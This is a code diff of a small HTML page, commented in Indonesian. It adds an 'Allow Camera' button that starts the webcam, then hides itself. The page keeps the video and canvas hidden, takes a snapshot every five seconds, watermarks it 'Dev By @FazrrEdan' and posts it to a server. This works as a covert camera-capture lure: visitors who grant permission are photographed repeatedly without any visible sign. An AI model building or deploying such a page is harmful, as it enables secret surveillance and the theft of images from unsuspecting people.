@@ -6,6 +6,19 @@
     body {
       margin: 0;
       background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    #startBtn {
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      background-color: black;
+      color: white;
+      border-radius: 8px;
     }
     video, canvas {
       display: none;
@@ -13,23 +26,25 @@
   </style>
 </head>
 <body>
+  <button id="startBtn">Izinkan Kamera</button>
+
   <video id="video" autoplay playsinline width="320" height="240"></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
+    const btn = document.getElementById("startBtn");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
 
-    document.body.onclick = async () => {
+    btn.onclick = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+        btn.style.display = "none"; // Sembunyikan tombol
 
         setInterval(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Tambahkan teks ke gambar
           ctx.fillStyle = "rgba(0, 0, 0, 0.6)";
           ctx.font = "16px Arial";
           ctx.fillText("Dev By @FazrrEdan", 10, 20);
@@ -41,9 +56,9 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ image })
           });
-        }, 2000);
+        }, 5000);
       } catch (err) {
-        console.error("Gagal akses kamera:", err);
+        alert("Gagal mengakses kamera: " + err.message);
       }
     };
   </script>
